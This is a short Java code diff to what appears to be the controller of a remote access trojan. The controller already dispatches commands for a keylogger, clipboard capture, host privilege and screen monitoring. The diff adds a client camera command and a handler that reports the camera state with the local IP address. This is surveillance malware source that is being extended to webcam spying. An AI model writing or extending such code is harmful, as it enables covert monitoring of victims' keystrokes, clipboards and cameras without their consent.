@@ -20,6 +20,7 @@ public class ProduceController {
         put(COMMAND_CLIENT_SYSTEM_USAGE, ProduceController::getClientSystemUsage);
         put(COMMAND_GET_HOST_PRIVILEGE, ProduceController::getHostPrivilege);
         put(COMMAND_CLIENT_MONITOR, ProduceController::getClientMonitor);
+        put(COMMAND_CLIENT_CAMERA, ProduceController::getClientCamera);
         put(COMMAND_CLIENT_CLIPBOARD, ProduceController::getClipboard);
         put(COMMAND_CLIENT_KEYLOGGER, ProduceController::getKeylogger);
         put(COMMAND_CLIENT_PROCESS, ProduceController::getProcess);
@@ -33,6 +34,11 @@ public class ProduceController {
 
     private static String getClientMonitor(Admin admin) throws UnknownHostException {
         return new MessageModel(DEFAULT_FROM, Admin.getGui().getCurrentClientId(), COMMAND_CLIENT_MONITOR).put("isMonitoring", index.isMonitoring)
+                .put("ipAddress", InetAddress.getLocalHost().getHostAddress()).json();
+    }
+
+    private static String getClientCamera(Admin admin) throws UnknownHostException {
+        return new MessageModel(DEFAULT_FROM, Admin.getGui().getCurrentClientId(), COMMAND_CLIENT_CAMERA).put("isUseCamera", index.isUseCamera)
                 .put("ipAddress", InetAddress.getLocalHost().getHostAddress()).json();
     }
 
